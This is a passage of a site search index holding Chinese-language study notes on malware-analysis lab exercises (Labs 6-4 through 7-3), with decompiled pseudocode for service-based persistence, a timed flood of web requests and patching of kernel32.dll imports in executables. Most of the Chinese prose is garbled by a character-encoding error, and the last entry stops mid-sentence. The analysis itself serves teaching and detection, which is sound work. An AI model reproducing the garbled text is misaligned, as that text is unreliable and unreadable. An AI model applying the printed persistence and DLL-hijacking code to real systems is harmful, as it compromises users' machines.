è¿™ä¸ªç¨‹åºçš„å¤§è‡´å†…å®¹ä¸ä¹‹å‰çš„ä¸€ä¸ªç¨‹åºå†…å®¹ç±»ä¼¼ã€‚å¦å¤–ï¼Œä»–æ·»åŠ äº†äº†çš„å‡½æ•°ï¼ˆä¹‹å‰åˆ†æçš„å¸¦ switch case è¯­å¥çš„å‡½æ•°ï¼‰ï¼Œå¢åŠ äº†åˆ é™¤çš„åŠŸèƒ½ã€‚\n"},{"id":281,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/06/lab6-4/","title":"Lab6 4","section":"06","content":"lab 6-4 #  QUESTION 1 #   What is the difference between the calls made from the main method in Labs 6-3 and 6-4?\n åˆ†åˆ«è€ƒè™‘ä¸‹é¢çš„å‡½æ•°ï¼š\n sub_401000ï¼šè¿™ä¸ªå‡½æ•°åœ¨ä¸¤ä¸ª lab ä¸­æ˜¯ç›¸åŒçš„ï¼Œéƒ½æ˜¯ç”¨äºæ£€æµ‹ç½‘ç»œçš„è¿é€šæ€§ï¼› sub_401040ï¼šä¹Ÿæ˜¯ç›¸åŒçš„ï¼Œä¸‹è½½ç½‘é¡µçš„æ–‡ä»¶ç„¶åè§£æå…¶ä¸­çš„å†…å®¹ï¼› sub_401050ï¼šå°±æ˜¯åœ¨ lab3 ä¸­çš„ sub_401130 è¿™ä¸ªå‡½æ•°ï¼Œé€šè¿‡ä¼ å…¥ä¸€ä¸ªå­—ç¬¦æ‰§è¡Œä¸åŒçš„å‘½ä»¤ï¼› sub_4012B5ï¼šåœ¨ lab2 ä¸­åˆ†æçš„å¯èƒ½æ˜¯ printf çš„å‡½æ•°ã€‚  QUESTION 2 #   What new code construct has been added to main?\n åœ¨æ£€æµ‹äº†ç½‘ç»œçš„è¿é€šæ€§ä¹‹åï¼Œæ·»åŠ äº†ä¸€ä¸ª for å¾ªç¯ã€‚å…¶ä»£ç ç»“æ„æ˜¯ cmp å’Œ jge ç»„æˆçš„ï¼š\nloc_40125A:\rcmp [ebp+var_C], 5A0h\rjge short loc_4012AF å¦å¤–è¿˜åœ¨ for å¾ªç¯ç»“æŸæ·»åŠ äº† sleep å‡½æ•°ï¼š\npush 0EA60h ; dwMilliseconds\rcall ds:Sleep QUESTION 3 #   What is the difference between this labâ€™s parse HTML function and those of the previous labs?\n åœ¨ç¬¬ä¸€é—®ä¸­åˆ†æè¿‡äº†ï¼Œè§£æçš„å‡½æ•°æ˜¯ sub_401040ï¼Œæˆ‘ä»¬æŸ¥çœ‹å®ƒçš„ä¼ªä»£ç ï¼š\nchar __cdecl sub_401040(int a1) {  char result; // al@2  int Buffer; // [sp+0h] [bp-230h]@3  char v3; // [sp+4h] [bp-22Ch]@9  HINTERNET hFile; // [sp+200h] [bp-30h]@1  HINTERNET hInternet; // [sp+204h] [bp-2Ch]@1  CHAR szAgent; // [sp+208h] [bp-28h]@1  DWORD dwNumberOfBytesRead; // [sp+228h] [bp-8h]@3  int v8; // [sp+22Ch] [bp-4h]@3   sprintf(\u0026amp;szAgent, aInternetExplor, a1);  hInternet = InternetOpenA(\u0026amp;szAgent, 0, 0, 0, 0);  hFile = InternetOpenUrlA(hInternet, szUrl, 0, 0, 0, 0);  if ( hFile )  {  v8 = InternetReadFile(hFile, \u0026amp;Buffer, 0x200u, \u0026amp;dwNumberOfBytesRead);  if ( v8 )  {  if ( (char)Buffer != 60 || SBYTE1(Buffer) != 33 || SBYTE2(Buffer) != 45 || SBYTE3(Buffer) != 45 )  {  sub_4012B5(aError2_3FailTo);  result = 0;  }  else  {  result = v3;  }  }  else  {  sub_4012B5(aError2_2FailTo);  InternetCloseHandle(hInternet);  InternetCloseHandle(hFile);  result = 0;  }  }  else  {  sub_4012B5(aError2_1FailTo);  InternetCloseHandle(hInternet);  result = 0;  }  return result; } ä¸»è¦çš„åŒºåˆ«æ˜¯åœ¨å‡½æ•° InternetOpenA() è¿™ä¸ªå‡½æ•°ä¹‹å‰æ·»åŠ äº†è¿™æ ·çš„ä¸€è¡Œä»£ç ï¼š\nsprintf(\u0026amp;szAgent, aInternetExplor, a1); è¿™ä¸€è¡Œçš„ä»£ç çš„ä½œç”¨æ˜¯æ‹¼æ¥å­—ç¬¦ä¸² aInternetExplor ä¸ a1 å¹¶ä¸”å°†ç»“æœèµ‹å€¼ç»™ szAgentã€‚\nQUESTION 4 #   How long will this program run? (Assume that it is connected to the Internet.)\n for å¾ªç¯çš„æ¬¡æ•°ï¼šï¼ˆ0x5A0 = 1440ï¼‰\n.text:0040125A cmp [ebp+var_C], 5A0h å¦‚æœä¸è€ƒè™‘å„ç§å­å‡½æ•°çš„æ‰§è¡Œæ—¶é—´ï¼Œä»…è€ƒè™‘åœ¨ _main ä¸­æ‰§è¡Œçš„ sleep å‡½æ•°çš„æ—¶é—´å ç”¨ã€‚æ¯æ¬¡ç¡çœ çš„æ—¶é—´ä¸ºï¼š\npush 0EA60h ; dwMilliseconds\rcall ds:Sleep æ‰€ä»¥æ€»çš„ç¨‹åºè¿è¡Œæ—¶é—´ä¸º 0xEA60 ms * 1440 = 60000 ms * 1440 = 1 min * 1440 = 24 h\næ‰€ä»¥å¦‚æœä¸è€ƒè™‘ç½‘ç»œçš„é“¾æ¥çŠ¶å†µå’Œå„ç§å­å‡½æ•°çš„è°ƒç”¨æ¬¡æ•°ï¼Œè¿™ä¸ªç¨‹åºå¤§çº¦ä¼šè¿è¡Œä¸€å¤©ã€‚\nQUESTION 5 #   Are there any new network-based indicators for this malware?\n æ¯æ¬¡ä½¿ç”¨çš„æµè§ˆå™¨å®¢æˆ·ç«¯éƒ½ä¸åŒï¼ˆåœ¨ç¬¬ä¸‰é—®ä¸­åˆ†æè¿‡ï¼‰ã€‚\nQUESTION 6 #   What is the purpose of this malware?\n å…ˆæ£€æŸ¥ Internet è¿æ¥ï¼Œä½¿ç”¨éšæ—¶é—´å¯å˜çš„ user-agent ä¸‹è½½ç½‘é¡µï¼Œè§£æHTMLï¼Œç¨‹åºè¿è¡Œ 24h ç»ˆæ­¢ã€‚\n"},{"id":282,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/07/lab7-1/","title":"Lab7 1","section":"07","content":"lab 7-1 #  QUESTION 1 #   How does this program ensure that it continues running (achieves persistence) when the computer is restarted?\n æˆ‘ä»¬å…ˆåˆ†æè¿™ä¸ªç¨‹åºçš„ç»“æ„ï¼ŒæŸ¥çœ‹ _main å‡½æ•°çš„ä¼ªä»£ç ï¼š\nint __cdecl main(int argc, const char **argv, const char **envp) {  SERVICE_TABLE_ENTRYA ServiceStartTable; // [sp+0h] [bp-10h]@1  int v5; // [sp+8h] [bp-8h]@1  int v6; // [sp+Ch] [bp-4h]@1   ServiceStartTable.lpServiceName = aMalservice;  ServiceStartTable.lpServiceProc = (LPSERVICE_MAIN_FUNCTIONA)sub_401040;  v5 = 0;  v6 = 0;  StartServiceCtrlDispatcherA(\u0026amp;ServiceStartTable);  return sub_401040(0, 0, ServiceStartTable.lpServiceName, ServiceStartTable.lpServiceProc, v5, v6); } å…¶ä¸­åˆ›å»ºäº†ä¸€ä¸ª SERVICE_TABLE_ENTRYA ç±»å‹çš„å˜é‡ï¼Œå°† sub_401040 è¿™ä¸ªå‡½æ•°èµ‹å€¼ç»™ lpServerceProc è¿™ä¸ªå­å˜é‡ï¼Œå¹¶é€šè¿‡è°ƒç”¨ StartServiceCtrlDispatcherA è¿™ä¸ªå‡½æ•°æ³¨å†Œè¿™ä¸ªæœåŠ¡ã€‚\nå¹¶ä¸”é€šè¿‡ sub_401040(0, 0, ServiceStartTable.lpServiceName, ServiceStartTable.lpServiceProc, v5, v6) çš„æ–¹å¼è°ƒç”¨äº†è¿™ä¸ªå‡½æ•°ï¼Œæ‰€ä»¥æˆ‘ä»¬è¿›ä¸€æ­¥åˆ†æè¿™ä¸ªå…³é”®çš„å‡½æ•° sub_401040()ï¼š\nint sub_401040() {  SC_HANDLE v0; // esi@3  HANDLE v1; // esi@3  signed int v2; // esi@4  SYSTEMTIME SystemTime; // [sp+0h] [bp-400h]@3  struct _FILETIME FileTime; // [sp+10h] [bp-3F0h]@3  CHAR Filename; // [sp+18h] [bp-3E8h]@3   if ( OpenMutexA(0x1F0001u, 0, Name) )  ExitProcess(0);  CreateMutexA(0, 0, Name);  v0 = OpenSCManagerA(0, 0, 3u);  GetCurrentProcess();  GetModuleFileNameA(0, \u0026amp;Filename, 0x3E8u);  CreateServiceA(v0, DisplayName, DisplayName, 2u, 0x10u, 2u, 0, \u0026amp;Filename, 0, 0, 0, 0, 0);  *(_DWORD *)\u0026amp;SystemTime.wYear = 0;  *(_DWORD *)\u0026amp;SystemTime.wDayOfWeek = 0;  *(_DWORD *)\u0026amp;SystemTime.wHour = 0;  *(_DWORD *)\u0026amp;SystemTime.wSecond = 0;  SystemTime.wYear = 2100;  SystemTimeToFileTime(\u0026amp;SystemTime, \u0026amp;FileTime);  v1 = CreateWaitableTimerA(0, 0, 0);  SetWaitableTimer(v1, (const LARGE_INTEGER *)\u0026amp;FileTime, 0, 0, 0, 0);  if ( !WaitForSingleObject(v1, 0xFFFFFFFF) )  {  v2 = 20;  do  {  CreateThread(0, 0, StartAddress, 0, 0, 0);  --v2;  }  while ( v2 );  }  Sleep(0xFFFFFFFF);  return 0; } æˆ‘ä»¬å‘ç°å…¶ä¸­çš„ä¸€ä¸ªå…³é”®çš„å‡½æ•° CreateServiceA(v0, DisplayName, DisplayName, 2u, 0x10u, 2u, 0, \u0026amp;Filename, 0, 0, 0, 0, 0);ï¼Œè¿™ä¸ªå‡½æ•°ç”¨äºåˆ›å»ºäº†ä¸€ä¸ªæœåŠ¡ï¼Œæˆ‘ä»¬æŸ¥çœ‹è¿™ä¸ªå‡½æ•°çš„åŸå‹ï¼š\nSC_HANDLE __stdcall CreateServiceA(SC_HANDLE hSCManager, LPCSTR lpServiceName, LPCSTR lpDisplayName, DWORD dwDesiredAccess, DWORD dwServiceType, DWORD dwStartType, DWORD dwErrorControl, LPCSTR lpBinaryPathName, LPCSTR lpLoadOrderGroup, LPDWORD lpdwTagId, LPCSTR lpDependencies, LPCSTR lpServiceStartName, LPCSTR lpPassword); è¿™ä¸ªå‡½æ•°çš„ç¬¬å…­ä¸ªå‚æ•°ï¼Œè°ƒç”¨æ—¶ä¼ å…¥çš„å‚æ•°æ˜¯ 2uï¼Œå¯ä»¥åœ¨ MSDN ä¸­æŸ¥æ‰¾åˆ°å…·ä½“çš„å„ä¸ªå‚æ•°çš„å«ä¹‰ï¼š\n   Value Meaning     SERVICE_AUTO_START 0x00000002 A service started automatically by the service control manager during system startup. For more information, see Automatically Starting Services.   SERVICE_BOOT_START 0x00000000 A device driver started by the system loader. This value is valid only for driver services.   SERVICE_DEMAND_START 0x00000003 A service started by the service control manager when a process calls the StartService function. For more information, see Starting Services on Demand.   SERVICE_DISABLED 0x00000004 A service that cannot be started. Attempts to start the service result in the error code ERROR_SERVICE_DISABLED.   SERVICE_SYSTEM_START 0x00000001 A device driver started by the IoInitSystem function. This value is valid only for driver services.    æ‰€ä»¥è¿™ä¸ªç¨‹åºé€šè¿‡åˆ›å»ºä¸€ä¸ªæœåŠ¡ï¼Œå¹¶ä¸”å°†å…¶ç¬¬å…­ä¸ªå‚æ•° DWORD dwServiceType è®¾ç½®ä¸º SERVICE_AUTO_START 0x02 æ¥è®¾ç½®ç¨‹åºçš„è‡ªå¯åŠ¨ã€‚\nQUESTION 2 #   Why does this program use a mutex?\n åœ¨ä¸Šé¢çš„ä¼ªä»£ç åˆ†æä¸­ï¼Œæˆ‘ä»¬å‘ç°ç¨‹åºåœ¨æ‰§è¡Œ sub_401040() è¿™ä¸ªå‡½æ•°ä¹‹å‰é¦–å…ˆä½¿ç”¨ CreateMutexA(0, 0, Name); è¿™ä¸ªå‡½æ•°åˆ›å»ºäº†ä¸€ä¸ªäº’æ–¥é‡ã€‚å¦‚æœé€šè¿‡ OpenMutexA(0x1F0001u, 0, Name) è¿™ä¸ªæ–¹æ³•æ£€æµ‹åˆ°äº’æ–¥é‡çš„å­˜åœ¨ï¼Œåˆ™ç¨‹åºç›´æ¥é€€å‡ºã€‚\nå…¶ç›®çš„åº”è¯¥æ˜¯ç¡®ä¿åé¢å¯¹è¿›ç¨‹ã€ç³»ç»Ÿæ—¶é—´ã€æ–‡ä»¶æˆ–è€…æœåŠ¡çš„è®¿é—®ï¼Œåªæœ‰ä¸€ä¸ªè¿›ç¨‹åœ¨ä½¿ç”¨ã€‚\nQUESTION 3 #   What is a good host-based signature to use for detecting this program?\n æ ¹æ®ç¬¬ä¸€é—®å¯¹ä¼ªä»£ç çš„åˆ†ææˆ‘ä»¬å¯ä»¥å¾—åˆ°ï¼š\n  è¢«è¿™ä¸ªç¨‹åºæ„ŸæŸ“çš„æœºå™¨ä¼šåˆ›å»ºä¸€ä¸ªæœåŠ¡ï¼Œå…¶åç§°ä¸º DisplayName = Malservice\n  è¢«è¿™ä¸ªæ„ŸæŸ“çš„æœºå™¨ï¼Œå¦‚æœç¨‹åºæ­£åœ¨è¿è¡Œï¼Œåˆ™ä¼šåˆ›å»ºä¸€ä¸ªäº’æ–¥é‡ Name = HGL345\n  QUESTION 4 #   What is a good network-based signature for detecting this malware?\n æˆ‘ä»¬è¿›ä¸€æ­¥åˆ†æä¼ªä»£ç ï¼Œå‘ç°è¿™ä¸ªç¨‹åºé€šè¿‡ do while å¾ªç¯åˆ›å»ºçº¿ç¨‹æ‰§è¡Œä»¥ä¸‹çš„å‡½æ•° 20 æ¬¡ï¼š\nCreateThread(0, 0, (LPTHREAD_START_ROUTINE)StartAddress, 0, 0, 0); äºæ˜¯æˆ‘ä»¬æŸ¥çœ‹ StartAddress ä¸­çš„å‡½æ•°ä¼ªä»£ç ï¼š\nvoid __stdcall __noreturn StartAddress(LPVOID lpThreadParameter) {  void *i; // esi@1   for ( i = InternetOpenA(szAgent, 1u, 0, 0, 0); ; InternetOpenUrlA(i, szUrl, 0, 0, 0x80000000, 0) )  ; } å…¶ä¸­ï¼š\n å­—ç¬¦ä¸² szAgent = Internet Explorer 8.0 å­—ç¬¦ä¸² szUrl = http://www.malwareanalysisbook.com  è¿™ä¸ªå‡½æ•°çš„åŠŸèƒ½æ˜¯æ‰“å¼€ä¸€ä¸ªæµè§ˆå™¨ Internet Explorer 8.0ï¼Œå¹¶ä¸”ä¸æ–­åœ°åœ¨è¿™ä¸ªæµè§ˆå™¨ä¸­æ‰“å¼€ç½‘å€ http://www.malwareanalysisbook.comã€‚\nQUESTION 5 #   What is the purpose of this program?\n æˆ‘ä»¬è¿›ä¸€æ­¥åˆ†æå‡½æ•° sub_401040 çš„é€»è¾‘ï¼Œå‘ç°åœ¨ do while å¾ªç¯ä¹‹å‰ SystemTime çš„å€¼è¢«è®¾ç½®ä¸ºäº† 2100 å¹´ 1 æœˆ 1 æ—¥ 00:00ï¼Œç»“åˆæˆ‘ä»¬åœ¨ç¬¬å››é—®ä¸­åˆ†æçš„é€»è¾‘ã€‚\næˆ‘ä»¬çŸ¥é“è¿™ä¸ªç¨‹åºçš„ç›®çš„æ˜¯åœ¨ 2100 å¹´ 1 æœˆ 1 æ—¥ 00:00 è¿™ä¸ªæ—¶é—´æ‰“å¼€ 20 ä¸ªçº¿ç¨‹ä¸æ–­æ‰“å¼€ç½‘é¡µ http://www.malwareanalysisbook.comã€‚çŒœæµ‹å…¶ç›®çš„æ˜¯åœ¨è¿™ä¸ªæ—¶é—´ç‚¹è”åˆå¤šå°æ„ŸæŸ“ä¸»æœºå¯¹ç›®æ ‡å‘èµ· DDoS æ”»å‡»ã€‚\nQUESTION 6 #   When will this program finish executing?\n æ ¹æ®ä¹‹å‰çš„åˆ†æï¼Œç¨‹åºåˆ›å»ºäº† 20 ä¸ªä¸ä¼šåœæ­¢çš„çº¿ç¨‹ä¹‹åä¼š Sleep(0xFFFFFFFF);ï¼Œè¿™æ˜¯ä¸€ä¸ª unsigned int ç±»å‹çš„æœ€å¤§å€¼ï¼Œä»¥æ¯«ç§’ä¸ºå•ä½è®¡ç®—ä¹‹åè¿™ä¸ªç¨‹åº sleep çš„æ—¶é—´ï¼Œå¾—åˆ° 49 å¤©  çš„ç»“æœã€‚\næ‰€ä»¥è¿™ä¸ªç¨‹åºçš„ä¸»æ§çº¿ç¨‹ä¼šåœ¨æ‰§è¡Œäº† 49 å¤©ä¹‹ååœæ­¢ï¼Œä½†æ˜¯å¾ˆæ˜¾ç„¶è¿™ä¸ªæ¶æ„ä»£ç çš„ä½œè€…å¹¶ä¸æƒ³è®©ä»–åœæ­¢ï¼Œä¹‹æ‰€ä»¥ä¸º 49 å¤©åªæ˜¯å› ä¸ºå¹¶ä¸èƒ½ä¼‘çœ æ›´é•¿çš„æ—¶é—´äº†ã€‚\n"},{"id":283,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/07/lab7-2/","title":"Lab7 2","section":"07","content":"lab 7-2 #  QUESTION 1 #   How does this program achieve persistence?\n æˆ‘ä»¬åŒæ ·çš„é€šè¿‡ _main å‡½æ•°å¼€å§‹åˆ†æï¼š\nint __cdecl main(int argc, const char **argv, const char **envp) {  OLECHAR *v3; // esi@3  LPVOID ppv; // [sp+0h] [bp-24h]@2  VARIANTARG pvarg; // [sp+4h] [bp-20h]@3  __int16 v7; // [sp+14h] [bp-10h]@3  int v8; // [sp+1Ch] [bp-8h]@3   if ( OleInitialize(0) \u0026gt;= 0 )  {  CoCreateInstance(\u0026amp;rclsid, 0, 4u, \u0026amp;riid, \u0026amp;ppv);  if ( ppv )  {  VariantInit(\u0026amp;pvarg);  v7 = 3;  v8 = 1;  v3 = SysAllocString(psz);  (*(void (__stdcall **)(LPVOID, OLECHAR *, __int16 *, VARIANTARG *, VARIANTARG *, VARIANTARG *))(*(_DWORD *)ppv + 44))(  ppv,  v3,  \u0026amp;v7,  \u0026amp;pvarg,  \u0026amp;pvarg,  \u0026amp;pvarg);  SysFreeString(v3);  }  OleUninitialize();  }  return 0; } æŸ¥çœ‹è¢«è°ƒç”¨çš„æ‰€æœ‰å‡½æ•°ï¼Œè¿™ä¸ªç¨‹åºä¼¼ä¹å¹¶æ²¡æœ‰å°è¯•æ°¸ä¹…åœ°è¿è¡Œã€‚\nQUESTION 2 #   What is the purpose of this program?\n æ ¹æ®ä¹‹å‰å¯¹ main å‡½æ•°çš„åˆ†æï¼Œè¿™ä¸ªç¨‹åºçš„ä½œç”¨æ˜¯ä»…ä»…æ˜¯æ‰“å¼€ http://www.malwareanalysisbook.com/ad.html\nQUESTION 3 #   When will this program finish executing?\n å¹¶æ²¡æœ‰ä»»ä½•å»¶æ—¶å‡½æ•°ï¼Œç›´æ¥é€€å‡ºã€‚\n"},{"id":284,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/07/lab7-3/","title":"Lab7 3","section":"07","content":"lab 7-3 #  QUESTION 1 #   How does this program achieve persistence to ensure that it continues running when the computer is restarted?\n é¦–å…ˆæŸ¥çœ‹å‡½æ•°å¯¼å…¥è¡¨ï¼Œå‘ç° Lab07-03.exe è¿™ä¸ªæ–‡ä»¶æœ‰å¯¼å…¥ä¸€ä¸ª CopyFileA è¿™ä¸ªæ•æ„Ÿå‡½æ•°ã€‚\nç„¶åæˆ‘ä»¬åˆ†æè¿™ä¸ªå¯æ‰§è¡Œæ–‡ä»¶çš„ä¼ªä»£ç ã€‚ä¼ªä»£ç å®šä¹‰äº†å¤§é‡å±€éƒ¨å˜é‡åï¼Œå…ˆè¿›è¡Œå¦‚ä¸‹çš„åˆ¤æ–­ï¼š\n if ( argc == 2 \u0026amp;\u0026amp; !strcmp(argv[1], aWarning_this_w) ) è¯¥åˆ¤æ–­çš„ä½œç”¨æ˜¯åˆ¤æ–­å‘½ä»¤è¡Œå‚æ•°é•¿åº¦æ˜¯å¦ä¸º 2ï¼Œç¬¬äºŒä¸ªå‚æ•°å†…å®¹æ˜¯å¦ä¸º WARNING_THIS_WILL_DESTROY_YOUR_MACHINEã€‚\nä»¥ä¸‹å‡ è¡Œçš„ä¼ªä»£ç ï¼Œé€šè¿‡æŸ¥çœ‹ MSDN çš„ API å‡½æ•°ä»‹ç»å¯ä»¥é˜…è¯»å…¶åŠŸèƒ½ï¼š\n v3 = CreateFileA(FileName, 0x80000000, 1u, 0, 3u, 0, 0);  hObject = v3;  v4 = CreateFileMappingA(v3, 0, 2u, 0, 0, 0);  v5 = (char *)MapViewOfFile(v4, 4u, 0, 0, 0);  v6 = v5;  argca = (int)v5;  v7 = CreateFileA(ExistingFileName, 0x10000000u, 1u, 0, 3u, 0, 0);  v50 = v7;  if ( v7 == (HANDLE)-1 )  exit(0);  v8 = CreateFileMappingA(v7, 0, 4u, 0, 0, 0);  if ( v8 == (HANDLE)-1 )  exit(0);  v9 = (const char **)MapViewOfFile(v8, 0xF001Fu, 0, 0, 0);  argva = v9;  if ( !v9 )  exit(0); å…¶åŠŸèƒ½å¤§æ¦‚æ˜¯åˆ›å»ºä¸€ä¸ªæ–‡ä»¶ FileName = C:\\Windows\\System32\\Kernel32.dllï¼Œå¹¶ä¸”å°†å…¶å†…å®¹æ˜ å°„åˆ°å†…å­˜ä¸­ä½œä¸ºä¸€ä¸ªå­—ç¬¦å‹çš„æŒ‡é’ˆ v5 å­˜å‚¨ã€‚å¹¶ä¸”æ‰“å¼€äº†æ–‡ä»¶ ExistingFileName = Lab07-03.dllï¼Œå¹¶å°†å…¶æ˜ å°„åˆ°äº†å˜é‡ v9\nåé¢ä¸€æ®µç›´åˆ°ä¸»å‡½æ•°ç»“æŸï¼Œå¤šæ¬¡è°ƒç”¨ sub_401040()ã€sub_401070()ã€sub_4010A0() è¿™äº›å‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°å†…éƒ¨åˆè°ƒç”¨äº† sub_401000 è¿™ä¸ªå‡½æ•°ï¼Œæˆ‘ä»¬æš‚æ—¶ä¸åˆ†æè¿™æ®µæ¯”è¾ƒé•¿çš„ç‰‡æ®µä»£ç ã€‚\nåœ¨å‡½æ•°ç»“æŸæ—¶ï¼Œè°ƒç”¨äº† sub_4011E0(aC, 0); è¿™ä¸ªå‡½æ•°ï¼Œæˆ‘ä»¬è¿›ä¸€æ­¥åˆ†æè¿™ä¸ªå‡½æ•°ã€‚ä¼ªä»£ç å¤§è‡´å¦‚ä¸‹ï¼š\n result = a2;  if ( a2 \u0026lt;= 7 )  {  v3 = lpFileName;  v4 = FindFirstFileA(lpFileName, \u0026amp;FindFileData);  hFindFile = v4;  while ( v4 != (HANDLE)-1 )  {  if ( !(FindFileData.dwFileAttributes \u0026amp; 0x10)  || !strcmp(FindFileData.cFileName, a_)  || !strcmp(FindFileData.cFileName, a__) )  {  v6 = strlen(FindFileData.cFileName) + 1;  v7 = (char *)malloc(strlen(v3) + strlen(FindFileData.cFileName) + 1);  strcpy(v7, lpFileName);  v7[strlen(lpFileName) - 1] = 0;  strcat(v7, FindFileData.cFileName);  if ( !stricmp((const char *)\u0026amp;FindFileData.dwReserved0 + v6 + 3, a_exe) )  sub_4010A0(v7);  v3 = lpFileName;  }  else  {  v5 = (char *)malloc(strlen(v3) + 2 * strlen(FindFileData.cFileName) + 6);  strcpy(v5, v3);  v5[strlen(v3) - 1] = 0;  strcat(v5, FindFileData.cFileName);  strcat(v5, asc_403038);  sub_4011E0(v5, a2 + 1);  }  v4 = hFindFile;  result = FindNextFileA(hFindFile, \u0026amp;FindFileData);  if ( !result )  return result;  }  result = FindClose((HANDLE)0xFFFFFFFF);  }  return result; æ²¡æœ‰çœ‹åˆ°ç‰¹åˆ«æœ‰ç‰¹å¾çš„ API å‡½æ•°ï¼Œæˆ‘ä»¬è½¬åˆ°æ±‡ç¼–ä»£ç ï¼Œå¹¶ä¸”æŸ¥çœ‹ xref from...ï¼ŒæŸ¥çœ‹å®ƒè°ƒç”¨çš„æ‰€æœ‰å‡½æ•°ï¼š\nå€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œè¿™ä¸ªå‡½æ•°è¿›è¡Œäº†è‡ªè°ƒç”¨ï¼Œå…¶ä¸­ä¸€ä¸ªæ¯”è¾ƒé‡è¦çš„å­å‡½æ•°æ˜¯ sub_4010A0 æˆ‘ä»¬è¿›ä¸€æ­¥åˆ†æè¿™ä¸ªå‡½æ•°ã€‚åŒæ ·çš„ç”¨ F5 æŸ¥çœ‹å…¶ä¼ªä»£ç ï¼š\n...  v1 = CreateFileA(lpFileName, 0x10000000u, 1u, 0, 3u, 0, 0);  v14 = v1;  v2 = CreateFileMappingA(v1, 0, 4u, 0, 0, 0);  hObject = v2;  result = MapViewOfFile(v2, 0xF001Fu, 0, 0, 0);  v4 = result;  v12 = result;  if ( result )  {  v5 = (int)result + *((_DWORD *)result + 15);  result = (const void *)IsBadReadPtr((char *)result + *((_DWORD *)result + 15), 4u);  if ( !result \u0026amp;\u0026amp; *(_DWORD *)v5 == 17744 )  {  v6 = (const void *)sub_401040(*(_DWORD *)(v5 + 128), v5, (int)v4);  v7 = v6;  result = (const void *)IsBadReadPtr(v6, 0x14u);  if ( !result )  {  for ( i = (int *)((char *)v7 + 12); *(i - 2) || *i; i += 5 )  {  v9 = (int *)sub_401040(*i, v5, (int)v4);  v10 = v9;  result = (const void *)IsBadReadPtr(v9, 0x14u);  if ( result )  return result;  if ( !stricmp((const char *)v10, Str2) )  {  qmemcpy(v10, \u0026amp;dword_403010, strlen((const char *)v10) + 1);  v4 = v12;  }  }  v11 = v5 + 208;  *(_DWORD *)v11 = 0;  *(_DWORD *)(v11 + 4) = 0;  UnmapViewOfFile(v4);  CloseHandle(hObject);  result = (const void *)CloseHandle(v14);  }  }  }  return result; ... æˆ‘ä»¬å‘ç°å…¶é€»è¾‘ä¸è°ƒç”¨è¿™ä¸ªå‡½æ•°çš„ä¼ å…¥å‚æ•°æœ‰ç€å¯†åˆ‡å…³ç³»ï¼Œæˆ‘ä»¬è€ƒè™‘ sub_4011E0() ä¸­è°ƒç”¨çš„ä¼ å…¥å‚æ•°ï¼Œå‘ç°åˆä¸ sub_4011E0 çš„ä¼ å…¥å‚æ•°æœ‰å…³ï¼Œæˆ‘ä»¬è¿›ä¸€æ­¥åˆ†æä¸»å‡½æ•°ä¸­ä¼ å…¥çš„å­—ç¬¦ä¸²ï¼Œå‘ç°å®ƒæ˜¯ä¸€ä¸ªå­—é¢é‡ï¼š\n.data:00403044 ; CHAR aC[]\r.data:00403044 aC db \u0026#39;C:\\*\u0026#39;,0 ; DATA XREF: _main:loc_401806\u0018o ä¹Ÿå°±æ˜¯è¯´å®ƒçš„ä¼ å…¥å‚æ•°æ˜¯ C:\\*ï¼Œè¿›è€Œåˆ†æ sub_4011E0 çš„é€»è¾‘ï¼š\n çŒœæµ‹å¤§æ¦‚æ˜¯å°† C:\\* åŒ¹é…åˆ°çš„æ‰€æœ‰æ–‡ä»¶åä½œä¸ºå‚æ•°ä¾æ¬¡ä¼ å…¥ sub_4010A0 è¿™ä¸ªå‡½æ•°ï¼Œæˆ‘ä¹ˆä»¬è¿›ä¸€æ­¥åˆ†æä¼ å…¥çš„é€»è¾‘ï¼Œå‘ç°éœ€è¦åŒ¹é…åˆ° .exe æ‰ä¼šä¼ å…¥è¿™ä¸ªå‡½æ•°ã€‚ ç»“åˆä¹‹å‰åœ¨è°ƒç”¨å›¾ä¸­å‘ç°çš„è‡ªè°ƒç”¨ï¼Œæˆ‘ä»¬çŒœæµ‹ sub_4011E0 æ˜¯ä¸€ä¸ªç”¨äºå¤„ç†æ–‡ä»¶å¤¹çš„å‡½æ•°ï¼Œsub_4010A0 åˆ™æ˜¯ä¸€ä¸ªç”¨äºå¤„ç†æ–‡ä»¶çš„å‡½æ•°ã€‚  çŸ¥é“äº† sub_4011E0 çš„å‚æ•°ä¹‹åï¼Œè¿›ä¸€æ­¥åˆ†æå®ƒçš„ä¼ªä»£ç ï¼Œå‘ç°å…¶ä¸­å…³é”®çš„ä¸‰è¡Œï¼š\n if ( !stricmp((const char *)v10, Str2) )  {  qmemcpy(v10, \u0026amp;dword_403010, strlen((const char *)v10) + 1);  v4 = v12;  } åˆ†æ Str2 çš„å†…å®¹ï¼š\n.data:00403020 ; char Str2[]\r.data:00403020 Str2 db \u0026#39;kernel32.dll\u0026#39;,0 ; DATA XREF: sub_4010A0+CE\u0018o å¦‚æœ v10 æ˜¯ kernel32.dll çš„è¿˜ï¼Œåˆ™è¦æ›¿æ¢ v10 çš„å†…å®¹ã€‚ä¹Ÿå°±æ˜¯è¯´è¿™ä¸ªæ¶æ„ä»£ç å°†è¦æ›¿æ¢ kernel32.dll è¿™ä¸ªåŠ¨æ€é“¾æ¥åº“ã€‚æš‚æ—¶è¿˜åˆ†æä¸å‡ºæ˜¯ä½¿ç”¨ä»€ä¹ˆå†…å®¹è¿›è¡Œçš„æ›¿æ¢ï¼Œæˆ‘ä»¬çŒœçš„ä½¿ç”¨çš„å°±æ˜¯ Lab07-03.dll è¿™ä¸ªåŠ¨æ€é“¾æ¥åº“ã€‚äºæ˜¯ï¼Œè¿™ä¸ªç¨‹åºé€šè¿‡æ›¿æ¢ kernel32.dll 